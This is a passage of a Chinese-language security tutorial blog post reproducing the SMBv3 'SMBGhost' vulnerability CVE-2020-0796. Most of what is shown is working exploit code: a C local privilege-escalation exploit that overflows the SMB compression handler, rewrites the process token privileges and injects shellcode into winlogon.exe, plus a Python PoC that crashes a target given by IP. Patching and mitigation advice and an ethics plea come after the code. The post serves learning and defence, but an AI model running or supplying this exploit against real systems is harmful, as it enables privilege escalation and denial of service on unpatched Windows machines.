type */		0x0E, 0x00,             /* length */		0x00, 0x00, 0x00, 0x00, /* reserved */		0x02, 0x00,             /* compression algorithm count */		0x00, 0x00,             /* padding */		0x01, 0x00, 0x00, 0x00, /* flags */		0x02, 0x00,             /* LZ77 */		0x03, 0x00,             /* LZ77+Huffman */		0x00, 0x00, 0x00, 0x00, /* padding */		0x00, 0x00, 0x00, 0x00	};		if ((err = send(sock, (const char *)buf, sizeof(buf), 0)) != SOCKET_ERROR) {		recv(sock, response, sizeof(response), 0); 	}	return err;}int send_compressed(SOCKET sock, unsigned char* buffer, ULONG len) {	int err = 0;	char response[8] = { 0 };	const uint8_t buf[] = {		/* NetBIOS Wrapper */		0x00,		0x00, 0x00, 0x33,		/* SMB Header */		0xFC, 0x53, 0x4D, 0x42, /* protocol id */		0xFF, 0xFF, 0xFF, 0xFF, /* original decompressed size, trigger arithmetic overflow */		0x02, 0x00,             /* compression algorithm, LZ77 */		0x00, 0x00,             /* flags */		0x10, 0x00, 0x00, 0x00, /* offset */	};	uint8_t* packet = (uint8_t*) malloc(sizeof(buf) + 0x10 + len);	if (packet == NULL) {		printf("Couldn't allocate memory with malloc()\n");		return error_exit(sock, NULL);	}	memcpy(packet, buf, sizeof(buf));	*(uint64_t*)(packet + sizeof(buf)) = 0x1FF2FFFFBC;	*(uint64_t*)(packet + sizeof(buf) + 0x8) = 0x1FF2FFFFBC;	memcpy(packet + sizeof(buf) + 0x10, buffer, len);	if ((err = send(sock, (const char*)packet, sizeof(buf) + 0x10 + len, 0)) != SOCKET_ERROR) {		recv(sock, response, sizeof(response), 0);	}	free(packet);	return err;}void inject(void) {	PROCESSENTRY32 entry;	entry.dwSize = sizeof(PROCESSENTRY32);	uint8_t shellcode[] = {		 0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x6D, 0x64, 0x00, 0x54,		 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,		 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,		 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,		 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,		 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99,		 0xff, 0xc2, // inc edx (1 = SW_SHOW)		 0xFF, 0xD7, 0x48, 0x83, 0xC4,		 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3, 0x00	};	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);	int pid = -1;	if (Process32First(snapshot, &entry) == TRUE) {		while (Process32Next(snapshot, &entry) == TRUE) {			if (lstrcmpiA(entry.szExeFile, "winlogon.exe") == 0) {				pid = entry.th32ProcessID;				break;			}		}	}	CloseHandle(snapshot);	if (pid < 0) {		printf("Could not find process\n");		return;	}	printf("Injecting shellcode in winlogon...\n");	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);	if (hProc == NULL) {		printf("Could not open process\n");		return;	}	LPVOID lpMem = VirtualAllocEx(hProc, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);	if (lpMem == NULL) {		printf("Remote allocation failed\n");		return;	}			if (!WriteProcessMemory(hProc, lpMem, shellcode, sizeof(shellcode), 0)) {		printf("Remote write failed\n");		return;	}		if (!CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpMem, 0, 0, 0)) {		printf("CreateRemoteThread failed\n");		return;	}	printf("Success! ;)\n");}int main(int argc, char* argv[]) {	WORD wVersionRequested = MAKEWORD(2, 2);	WSADATA wsaData = { 0 };	SOCKET sock = INVALID_SOCKET;	uint64_t ktoken = 0;	int err = 0;	printf("-= CVE-2020-0796 LPE =-\n");	printf("by @danigargu and @dialluvioso_\n\n");	if ((err = WSAStartup(wVersionRequested, &wsaData)) != 0) {		printf("WSAStartup() failed with error: %d\n", err);		return EXIT_FAILURE;	}	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) {		printf("Couldn't find a usable version of Winsock.dll\n");		WSACleanup();		return EXIT_FAILURE;	}	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);	if (sock == INVALID_SOCKET) {		printf("socket() failed with error: %d\n", WSAGetLastError());		WSACleanup();		return EXIT_FAILURE;	}	sockaddr_in client;	client.sin_family = AF_INET;	client.sin_port = htons(445);	InetPton(AF_INET, "127.0.0.1", &client.sin_addr);	if (connect(sock, (sockaddr*)& client, sizeof(client)) == SOCKET_ERROR) {		return error_exit(sock, "connect()");	}	printf("Successfully connected socket descriptor: %d\n", (int)sock);	printf("Sending SMB negotiation request...\n");	if (send_negotiation(sock) == SOCKET_ERROR) {		printf("Couldn't finish SMB negotiation\n");		return error_exit(sock, "send()");	}	printf("Finished SMB negotiation\n");	ULONG buffer_size = 0x1110;	UCHAR *buffer = (UCHAR *)malloc(buffer_size);	if (buffer == NULL) {		printf("Couldn't allocate memory with malloc()\n");		return error_exit(sock, NULL);	}	ktoken = get_process_token();	if (ktoken == -1) {		printf("Couldn't leak ktoken of current process...\n");		return EXIT_FAILURE;	}	printf("Found kernel token at %#llx\n", ktoken);	memset(buffer, 'A', 0x1108);	*(uint64_t*)(buffer + 0x1108) = ktoken + 0x40; /* where we want to write */	ULONG CompressBufferWorkSpaceSize = 0;	ULONG CompressFragmentWorkSpaceSize = 0;	err = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_XPRESS, 		&CompressBufferWorkSpaceSize, &CompressFragmentWorkSpaceSize);	if (err != STATUS_SUCCESS) {		printf("RtlGetCompressionWorkSpaceSize() failed with error: %d\n", err);		return error_exit(sock, NULL);	}	ULONG FinalCompressedSize;	UCHAR compressed_buffer[64];	LPVOID lpWorkSpace = malloc(CompressBufferWorkSpaceSize);	if (lpWorkSpace == NULL) {		printf("Couldn't allocate memory with malloc()\n");		return error_exit(sock, NULL);	}	err = RtlCompressBuffer(COMPRESSION_FORMAT_XPRESS, buffer, buffer_size,		compressed_buffer, sizeof(compressed_buffer), 4096, &FinalCompressedSize, lpWorkSpace);	if (err != STATUS_SUCCESS) {		printf("RtlCompressBuffer() failed with error: %#x\n", err);		free(lpWorkSpace);		return error_exit(sock, NULL);	}		printf("Sending compressed buffer...\n");	if (send_compressed(sock, compressed_buffer, FinalCompressedSize) == SOCKET_ERROR) {		return error_exit(sock, "send()");	}	printf("SEP_TOKEN_PRIVILEGES changed\n");	inject();	WSACleanup();	return EXIT_SUCCESS;}
```

2.Python 代码解析
-------------

CVE-2020-0796-POC.py

```
import socket, struct, sysclass Smb2Header:    def __init__(self, command, message_id):        self.protocol_id = "\xfeSMB"        self.structure_size = "\x40\x00"  # Must be set to 0x40        self.credit_charge = "\x00"*2        self.channel_sequence = "\x00"*2        self.channel_reserved = "\x00"*2        self.command = command        self.credits_requested = "\x00"*2  # Number of credits requested / granted        self.flags = "\x00"*4        self.chain_offset = "\x00"*4  # Points to next message        self.message_id = message_id        self.reserved = "\x00"*4        self.tree_id = "\x00"*4  # Changes for some commands        self.session_id = "\x00"*8        self.signature = "\x00"*16    def get_packet(self):        return self.protocol_id + self.structure_size + self.credit_charge + self.channel_sequence + self.channel_reserved + self.command + self.credits_requested + self.flags + self.chain_offset + self.message_id + self.reserved + self.tree_id + self.session_id + self.signatureclass Smb2NegotiateRequest:    def __init__(self):        self.header = Smb2Header("\x00"*2, "\x00"*8)        self.structure_size = "\x24\x00"        self.dialect_count = "\x08\x00"  # 8 dialects        self.security_mode = "\x00"*2        self.reserved = "\x00"*2        self.capabilities = "\x7f\x00\x00\x00"        self.guid = "\x01\x02\xab\xcd"*4        self.negotiate_context = "\x78\x00"        self.additional_padding = "\x00"*2        self.negotiate_context_count = "\x02\x00"  # 2 Contexts        self.reserved_2 = "\x00"*2        self.dialects = "\x02\x02" + "\x10\x02" + "\x22\x02" + "\x24\x02" + "\x00\x03" + "\x02\x03" + "\x10\x03" + "\x11\x03"  # SMB 2.0.2, 2.1, 2.2.2, 2.2.3, 3.0, 3.0.2, 3.1.0, 3.1.1        self.padding = "\x00"*4    def context(self, type, length):        data_length = length        reserved = "\x00"*4        return type + data_length + reserved    def preauth_context(self):        hash_algorithm_count = "\x01\x00"  # 1 hash algorithm        salt_length = "\x20\x00"        hash_algorithm = "\x01\x00"  # SHA512        salt = "\x00"*32        pad = "\x00"*2        length = "\x26\x00"        context_header = self.context("\x01\x00", length)        return context_header + hash_algorithm_count + salt_length + hash_algorithm + salt + pad    def compression_context(self):        compression_algorithm_count = "\x03\x00"  # 3 Compression algorithms        padding = "\x00"*2        flags = "\x01\x00\x00\x00"        algorithms = "\x01\x00" + "\x02\x00" + "\x03\x00"  # LZNT1 + LZ77 + LZ77+Huffman        length = "\x0e\x00"        context_header = self.context("\x03\x00", length)        return context_header + compression_algorithm_count + padding + flags + algorithms    def get_packet(self):        padding = "\x00"*8        return self.header.get_packet() + self.structure_size + self.dialect_count + self.security_mode + self.reserved + self.capabilities + self.guid + self.negotiate_context + self.additional_padding + self.negotiate_context_count + self.reserved_2 + self.dialects + self.padding + self.preauth_context() + self.compression_context() + paddingclass NetBIOSWrapper:    def __init__(self, data):        self.session = "\x00"        self.length = struct.pack('>i', len(data)).decode('latin1')[1:]        self.data = data    def get_packet(self):        return self.session + self.length + self.dataclass Smb2CompressedTransformHeader:    def __init__(self, data):        self.data = data        self.protocol_id = "\xfcSMB"        self.original_decompressed_size = struct.pack('<i', len(self.data)).decode('latin1')        self.compression_algorithm = "\x01\x00"        self.flags = "\x00"*2        self.offset = "\xff\xff\xff\xff"  # Exploit the vulnerability    def get_packet(self):        return self.protocol_id + self.original_decompressed_size + self.compression_algorithm + self.flags + self.offset + self.datadef send_negotiation(sock):    negotiate = Smb2NegotiateRequest()    packet = NetBIOSWrapper(negotiate.get_packet()).get_packet()    sock.send(packet.encode('latin1'))    sock.recv(3000)def send_compressed(sock, data):    compressed = Smb2CompressedTransformHeader(data)    packet = NetBIOSWrapper(compressed.get_packet()).get_packet()    sock.send(packet.encode('latin1'))    #sock.recv(1000)if __name__ == "__main__":    if len(sys.argv) != 2:        exit("[-] Supply an IP: {} IP_ADDR".format(sys.argv[0]))    sock = socket.socket(socket.AF_INET)    sock.settimeout(3)    sock.connect((sys.argv[1], 445))    send_negotiation(sock)    send_compressed(sock, "A" * 50)
```

五. 防御措施
=======

写到这里，这篇 CVE-2020-0796 漏洞复现的文章就介绍结束了，希望对您有所帮助。这篇文章也存在一些不足，作者没有更深入的理解其原理，也是作为网络安全初学者的慢慢成长路吧！希望未来能更透彻撰写相关文章。

最后补充防御方法：

*   运行 Windows 更新，完成 Windows10 2020 年 3 月累积更新补丁的安装。  
    操作步骤：设置 -> 更新和安全 ->Windows 更新，点击 “检查更新”。
    
*   直接下载对应补丁进行安装（KB4551762）。  
    https://www.catalog.update.microsoft.com/Search.aspx?q=KB4551762
    
*   访问微软该漏洞官方页面，选择相应的 Windows 版本安全更新，独立安装该漏洞安全补丁。  
    https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDKOoHe2Xl1jq3NOuutdmoK7oQ3LKedSW52bD7YXdsZhpptjpHwMc4dA/640?wx_fmt=png)

*   根据 BleepingComputer 的说法，尽管 Microsoft 并未共享禁用 SMBv3 压缩的官方方法，但是 Foregenix Solutions 架构师 Niall Newman 在分析了 Srv2.sys 文件后可以通过手动修改注册表，防止被黑客远程攻击。  
    (1) 在注册表 “HKLM\SYSTEM\CurrentControlSet
    
    \Services\LanmanServer\Parameters” 建立一个名为 DisableCompression 的 DWORD，值为 1，禁止 SMB 的压缩功能。(2) 在管理员模式启动 PowerShell，将以下命令复制到 Powershell 命令行，执行即可。
    

> Set-ItemProperty -Path “HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters” DisableCompression -Type DWORD -Value 1 -Force

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icDbgzEJXAP4tHTPmJmcYnNcfPYxVaZUTMemUbRgf5AySKaHxEzYaA9Cw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRMadPwxU4vRNpj3icddMU8icD0xPLCtgdiclb8jEDABLictCDFZ5KAPbhkyoetfOMWYGicqCl81piabwlyQ/640?wx_fmt=png)

*   若无业务必要，在网络安全域边界防火墙封堵文件打印和共享端口 TCP 135/139/445 以缓解此问题。
    
*   可以通过安全厂商的漏洞检验和修复工具来检查是否存在漏洞和进行漏洞修复。
    

六. 总结
=====

希望这系列文章对您有所帮助，真的感觉自己技术好菜，要学的知识好多。作为初学者，我们可能有差距，不论你之前是什么方向，是什么工作，是什么学历，是大学大专中专，亦或是高中初中，只要你喜欢安全，喜欢渗透，就朝着这个目标去努力吧！有差距不可怕，我们需要的是去缩小差距，去战斗，况且这个学习的历程真的很美，安全真的有意思。但切勿去做坏事，我们需要的是白帽子，是维护我们的网络，安全路上共勉。

前文回顾（下面的超链接可以点击喔）：

*   [[系统安全] 一. 什么是逆向分析、逆向分析应用及经典扫雷游戏逆向](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484670&idx=1&sn=c31b15b73f27a7ce44ae1350e7f708a2&chksm=cfccb433f8bb3d25c25f044caac29d358fe686602011d8e4cbdc504e3a587e756215ce051819&scene=21#wechat_redirect)
    
*   [[系统安全] 二. 如何学好逆向分析及吕布传游戏逆向案例](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484756&idx=1&sn=ef95ff95474c51fa2bd4b9b4847ebb54&chksm=cfccb599f8bb3c8fa4852416cff6695fc8dcc9aadb3295c7249c12c03cad4c146a93e6250d56&scene=21#wechat_redirect)
    
*   [[系统安全] 三. IDA Pro 反汇编工具初识及逆向工程解密实战](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484812&idx=1&sn=9b77853a5b9da0f7a688e592dba3ddba&chksm=cfccb541f8bb3c57faffc7661a452238debe09cc7a57ae2d9e9d835d6520ee441bfd9d5ad119&scene=21#wechat_redirect)
    
*   [[系统安全] 四. OllyDbg 动态分析工具基础用法及 Crakeme 逆向破解](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484950&idx=1&sn=07d8f0b20f599586ef06035354b14630&chksm=cfccb6dbf8bb3fcd6d2efcc7b6757fabd8015d86f43e3bc8ae6cb9367d19492aec881374fca2&scene=21#wechat_redirect)
    
*   [[系统安全] 五. OllyDbg 和 Cheat Engine 工具逆向分析植物大战僵尸游戏](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485043&idx=1&sn=028c702990f722d087c6c349fb34f5fb&chksm=cfccb6bef8bb3fa8882994f7412db6b769d382abbafa6b5b3bd1b5ae62dffa20e81c7170ecb4&scene=21#wechat_redirect)
    
*   [[系统安全] 六. 逆向分析之条件语句和循环语句源码还原及流程控制](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485936&idx=1&sn=b1c282021280bb24646a9bf7c0f1fa6a&chksm=cfccb93df8bb302b51ae1026dba4f8839a1c68690df0e8da3242e9c1ead0182bf6c34dd44ada&scene=21#wechat_redirect)
    
*   [[系统安全] 七. 逆向分析之 PE 病毒原理、C++ 实现文件加解密及 OllyDbg 逆向](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485996&idx=1&sn=d5e323f16ce0b3d88c678a1fc1848596&chksm=cfccbae1f8bb33f7fad687d17ba7c10312bf2d756e460217a5d60ef2af0c012336292918128d&scene=21#wechat_redirect)
    
*   [[系统安全] 八. Windows 漏洞利用之 CVE-2019-0708 复现及蓝屏攻击](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486024&idx=1&sn=102ace20c2b15f4e7a9f910b56b84aec&chksm=cfccba85f8bb33939ac7e99cae23d1b6da5a0db4e6ff8bc7535a77a46a4204855de41aa446dd&scene=21#wechat_redirect)
    
*   [[系统安全] 九. Windows 漏洞利用之 MS08-067 远程代码执行漏洞复现及深度提权](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486057&idx=1&sn=7e7899b9285ac04f0d9745b4c455b005&chksm=cfccbaa4f8bb33b25ffcd780764ad86dc63edc7dd56d09e466254f6277851b5a4a545bb209a4&scene=21#wechat_redirect)
    
*   [系统安全] 十. Windows 漏洞利用之 SMBv3 服务远程代码执行漏洞（CVE-2020-0796）复现
    

最后，真诚地感谢您关注 “娜璋之家” 公众号，也希望我的文章能陪伴你成长，希望在技术路上不断前行。文章如果对你有帮助、有感悟，就是对我最好的回报，且看且珍惜！再次感谢您的关注，也请帮忙宣传下“娜璋之家”，哈哈~ 初来乍到，还请多多指教。顺便说一句，今天 CSDN 账号的粉丝破十万了，还挺开心的。  

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZePZ27y7oibNu4BGibRAq4HydK4JWeQXtQMKibpFEkxNKClkDoicWRC06FHBp99ePyoKPGkOdPDezhg/640?wx_fmt=png)

(By: 娜璋之家 2020-12-22 夜于武汉)

参考文献：  
[1] https://github.com/danigargu/CVE-2020-0796  
[2] https://github.com/ollypwn/SMBGhost  
[3] https://github.com/eastmountyxz/CVE-2020-0796-SMB  
[4] https://github.com/joaozietolie/CVE-2020-0796-Checker  
[5] [更新 ：公开渠道出现本地提权工具 | 微软 Windows SMBv3 服务远程代码执行漏洞（CVE-2020-0796）通告 - 奇安信威胁情报中心 红雨滴团队](https://mp.weixin.qq.com/s?__biz=MzI2MDc2MDA4OA==&mid=2247490831&idx=2&sn=4126b8d0565b1f37b7b4dc3707af4b07&scene=21#wechat_redirect)  
[6] 关于 CVE-2020-0796 - 我要变超人  
[7] CVE-2020-0796 本地利用简析  
[8] CVE-2020-0796 蓝屏 POC 漏洞复现 - Jie_Blog  
[9] https://download.csdn.net/download/ltt440888/12255558  
[10] CVE-2020-0796 SMBv3 漏洞复现 (蓝屏 poc) - L0ading  
[11] CVE-2020-0796：SMBv3 的 RCE 漏洞，下一个 EternalBlue？- NOSEC 平台  
[12] 135、137、138、139 和 445 端口 - 谢公子大佬  
[13] Linux 文件共享服务之 Samba - 谢公子大佬  
[14] 445 端口不通经验总结 - frankarmstrong  
[15] https://www.bilibili.com/video/av97457537/  
[16] CVE-2020-0796 SMBv3 漏洞蓝屏复现 + 提权 - anlalu233  
[17] https://github.com/ZecOps/CVE-2020-0796-LPE-POC